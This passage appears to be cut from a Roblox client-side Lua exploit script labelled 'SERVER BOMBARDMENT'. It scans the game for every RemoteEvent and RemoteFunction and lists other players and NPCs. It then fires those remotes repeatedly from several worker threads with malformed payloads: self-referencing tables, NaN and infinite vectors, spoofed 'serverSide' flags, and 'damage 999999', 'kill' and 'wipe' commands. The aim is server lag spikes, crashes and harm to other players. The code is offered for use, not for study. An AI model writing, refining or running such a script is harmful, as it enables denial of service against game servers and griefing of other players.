-- Utility
local function Log(msg)
    print("[SERVER BOMBARDMENT] " .. msg)
end

local function SafeCall(func)
    local success, err = pcall(func)
    if success then
        Cache.Stats.TotalFired = Cache.Stats.TotalFired + 1
    end
    return success
end

-- Pre-allocate cyclic states and payload templates to prevent Garbage Collection (GC) lag spikes
local function InitializeStateDeploys()
    Cache.PreallocatedPayloads = {}
    for i = 1, 10 do
        local cyclic = {}
        cyclic.self = cyclic
        cyclic.index = i
        cyclic.timestamp = 0
        cyclic.buffer = string.rep("OPTIMIZED_", 16)
        table.insert(Cache.PreallocatedPayloads, {
            CyclicTable = cyclic,
            ExtremeVector = Vector3.new(0/0, math.huge, 0/0),
            ExtremeCFrame = CFrame.new(math.huge, math.huge, math.huge)
        })
    end
end
InitializeStateDeploys()

-- CRITICAL: Optimized hierarchical child/descendant indexing across ReplicatedStorage and game services
local function ScanAllRemotes()
    Log("Scanning for FE remotes (Optimized Child & ReplicatedStorage Indexing)...")
    
    Cache.TouchEvents = {}
    Cache.AllRemoteEvents = {}
    Cache.RemoteFunctions = {}
    Cache.ReplicatedNodes = {}
    
    local locations = {
        Services.ReplicatedStorage,
        Services.ReplicatedFirst,
        Services.JointsService,
        Services.Workspace,
        Services.Players,
        Services.StarterGui
    }
    
    for _, location in ipairs(locations) do
        pcall(function()
            -- Partition ReplicatedStorage nodes for targeted state injection
            if location == Services.ReplicatedStorage then
                for _, child in ipairs(location:GetChildren()) do
                    table.insert(Cache.ReplicatedNodes, child)
                end
            end
            
            for _, obj in ipairs(location:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    table.insert(Cache.AllRemoteEvents, obj)
                    
                    local nameLower = obj.Name:lower()
                    if nameLower:find("touch") or obj.Name == "TouchEvent" or nameLower:find("event") or 
                       nameLower:find("net") or nameLower:find("sync") or nameLower:find("action") or
                       nameLower:find("remote") or nameLower:find("fire") then
                        table.insert(Cache.TouchEvents, obj)
                    end
                elseif obj:IsA("RemoteFunction") then
                    table.insert(Cache.RemoteFunctions, obj)
                end
            end
        end)
    end
    
    Cache.Stats.RemotesFound = #Cache.AllRemoteEvents
    
    Log(string.format("Found %d RemoteEvents (%d TouchEvents) and %d RemoteFunctions", 
        #Cache.AllRemoteEvents, #Cache.TouchEvents, #Cache.RemoteFunctions))
end

-- Scan for trigger parts and environment interactables (Seats, Platforms, Triggers, Zones, Buttons, Levers)
local function ScanTriggerParts()
    Log("Scanning for trigger parts and environmental interactables...")
    
    Cache.TriggerParts = {}
    
    for _, obj in ipairs(Services.Workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            local name = obj.Name:lower()
            
            if name:find("trip") or name:find("trigger") or name:find("touch") or 
               name:find("seat") or name:find("vehicleseat") or name:find("slide") or 
               name:find("platform") or name:find("button") or name:find("lever") or 
               name:find("zone") or name:find("teleport") or name:find("damage") or 
               name:find("kill") or name:find("switch") or name:find("pad") or
               obj:FindFirstChildOfClass("TouchTransmitter") or obj:FindFirstChildOfClass("ClickDetector") or
               obj:FindFirstChildOfClass("ProximityPrompt") then
                table.insert(Cache.TriggerParts, obj)
            end
        end
    end
    
    Log(string.format("Found %d trigger and environment parts", #Cache.TriggerParts))
end

-- Get OTHER players with cached flat-array child components for ultra-fast traversal
local function GetOtherPlayers()
    Cache.OtherPlayers = {}
    Cache.NPCs = {}
    
    if Config.TargetAllPlayers then
        for _, player in ipairs(Services.Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local char = player.Character
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local humanoid = char:FindFirstChildOfClass("Humanoid")
                
                if hrp and humanoid then
                    local playerData = {
                        Player = player,
                        Character = char,
                        HRP = hrp,
                        Humanoid = humanoid,
                        Head = char:FindFirstChild("Head"),
                        Torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"),
                        Backpack = player:FindFirstChild("Backpack"),
                        Parts = {}
                    }
                    
                    -- Pre-cache child components to avoid runtime overhead during firing loops
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Attachment") or 
                           part:IsA("Clothing") or part:IsA("Shirt") or part:IsA("Pants") then
                            table.insert(playerData.Parts, part)
                        end
                    end
                    
                    if playerData.Backpack then
                        for _, tool in ipairs(playerData.Backpack:GetChildren()) do
                            table.insert(playerData.Parts, tool)
                        end
                    end
                    
                    table.insert(Cache.OtherPlayers, playerData)
                end
            end
        end
    end
    
    if Config.TargetNPCs then
        local npcFolders = {
            Services.Workspace:FindFirstChild("Customers"),
            Services.Workspace:FindFirstChild("NPCs"),
            Services.Workspace:FindFirstChild("Enemies"),
            Services.Workspace:FindFirstChild("Characters"),
            Services.Workspace:FindFirstChild("Mobs"),
            Services.Workspace:FindFirstChild("Dummies")
        }
        
        for _, folder in ipairs(npcFolders) do
            if folder then
                for _, npc in ipairs(folder:GetDescendants()) do
                    if npc:IsA("Model") then
                        local hrp = npc:FindFirstChild("HumanoidRootPart")
                        local humanoid = npc:FindFirstChildOfClass("Humanoid")
                        
                        if hrp and humanoid then
                            local npcData = {
                                Character = npc,
                                HRP = hrp,
                                Humanoid = humanoid,
                                Parts = {}
                            }
                            for _, part in ipairs(npc:GetDescendants()) do
                                if part:IsA("BasePart") or part:IsA("Accessory") then
                                    table.insert(npcData.Parts, part)
                                end
                            end
                            table.insert(Cache.NPCs, npcData)
                        end
                    end
                end
            end
        end
    end
    
    Cache.Stats.PlayersAffected = #Cache.OtherPlayers + #Cache.NPCs
    return Cache.Stats.PlayersAffected
end

-- THE MAIN ATTACK: Utilizes preallocated state deploys, zero-GC payloads, ReplicatedStorage nodes, and firecd/cooldown injection
local function FireRemotesOnOthers()
    if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then
        return 0
    end
    
    local fireCount = 0
    local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
    
    local allTargets = {}
    if Config.TargetAllPlayers then
        for _, p in ipairs(Cache.OtherPlayers) do table.insert(allTargets, p) end
    end
    if Config.TargetNPCs then
        for _, n in ipairs(Cache.NPCs) do table.insert(allTargets, n) end
    end
    
    local triggerParts = Cache.TriggerParts or {}
    local replicatedNodes = Cache.ReplicatedNodes or {}
    
    -- Pull a pre-allocated payload bundle to guarantee zero garbage collection overhead and consistent spikes
    local payloadTemplate = Cache.PreallocatedPayloads[math.random(1, #Cache.PreallocatedPayloads)]
    local cyclicTable = payloadTemplate.CyclicTable
    cyclicTable.timestamp = os.clock()
    local extremeVector = payloadTemplate.ExtremeVector
    local extremeCFrame = payloadTemplate.ExtremeCFrame
    
    -- METHOD 1: High-Frequency TouchEvent Saturation with ReplicatedStorage node context
    for _, touchEvent in ipairs(Cache.TouchEvents) do
        for _, target in ipairs(allTargets) do
            if #triggerParts > 0 then
                local part = triggerParts[math.random(1, #triggerParts)]
                SafeCall(function()
                    touchEvent:FireServer(target.HRP, part, cyclicTable, "touch", true)
                    fireCount = fireCount + 1
                end)
            end
            
            if #replicatedNodes > 0 then
                local repNode = replicatedNodes[math.random(1, #replicatedNodes)]
                SafeCall(function()
                    touchEvent:FireServer(target.Character, repNode, "trip", extremeVector)
                    fireCount = fireCount + 1
                end)
            end
        end
    end
    
    -- METHOD 2: Multi-Argument RemoteEvent Flood with State Deploys, firecd/cooldown syntax, and Verb variations
    for _, remote in ipairs(Cache.AllRemoteEvents) do
        for _, target in ipairs(allTargets) do
            local styleVerbs = {"trip", "damage", "kill", "teleport", "slide", "bounce", "reset", "wipe", "activate", "event", "firecd", "cooldown", "debounce", "rateLimit"}
            local chosenVerb = styleVerbs[math.random(1, #styleVerbs)]
            
            SafeCall(function()
                remote:FireServer(target.HRP, extremeCFrame, chosenVerb, os.clock(), cyclicTable)
                fireCount = fireCount + 1
            end)
            
            if target.Parts and #target.Parts > 0 then
                local randomComponent = target.Parts[math.random(1, #target.Parts)]
                SafeCall(function()
                    remote:FireServer(randomComponent, chosenVerb, {
                        firecd = true,
                        cooldownTime = 0,
                        debounceToken = 0,
                        lastFired = os.clock(),
                        serverSide = true,
                        FEOnly = true
                    }, extremeVector)
                    fireCount = fireCount + 1
                end)
            end
            
            if target.Player then
                SafeCall(function()
                    remote:FireServer(target.Player, target.UserId, chosenVerb, "firecd", cyclicTable, extremeVector, extremeCFrame)
                    fireCount = fireCount + 1
                end)
            end
            
            if intensity >= 1 then
                SafeCall(function()
                    remote:FireServer(target.HRP, "damage", 999999, true, Services.Workspace, chosenVerb, "firecd")
                    fireCount = fireCount + 1
                end)
            end
            
            if intensity >= 3 and #replicatedNodes > 0 then
                local repNode = replicatedNodes[math.random(1, #replicatedNodes)]
                SafeCall(function()
                    remote:FireServer({
                        player = target.Player or target.Character,
                        storageNode = repNode,
                        service = Services.ReplicatedStorage,
                        cyclic = cyclicTable,
                        vector = extremeVector,
                        matrix = extremeCFrame,
                        verb = chosenVerb,
                        firecd = true,
                        serverSide = true,
                        forceExecute = true
                    })
                    fireCount = fireCount + 1
                end)
            end
            
            if intensity >= 5 then
                SafeCall(function()
                    remote:FireServer(target.Player, target.Character, target.Humanoid, Services.Lighting, Services.Teams, cyclicTable, extremeVector, extremeCFrame, {
                        serverSide = true, 
                        FEOnly = true, 
                        OnlyServer = true, 
                        firecd = true,
                        action = "wipe"
                    })
                    fireCount = fireCount + 1
                end)
            end
        end
    end
    
    -- METHOD 3: Concurrent RemoteFunction Invocations with State Deploys
    for _, remoteFunc in ipairs(Cache.RemoteFunctions) do
        for _, target in ipairs(allTargets) do
            task.spawn(function()
                SafeCall(function()
                    remoteFunc:InvokeServer(target.HRP, Services.Workspace, cyclicTable, extremeVector, "firecd", "activate")
                    fireCount = fireCount + 1
                end)
            end)
        end
    end
    
    return fireCount
end

        if Config.Active then
            GetOtherPlayers()
            
            local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
            local workerThreads = 3 + (intensity * 2)
            
            for w = 1, workerThreads do
                task.spawn(function()
                    if Config.Active then
                        FireRemotesOnOthers()
                    end
                end)
            end
            
            -- Perfectly calibrated tick pacing to maintain continuous high spikes without hitching
            task.wait(0.025 + (0.04 / (intensity + 1)))
        end
    end
end)
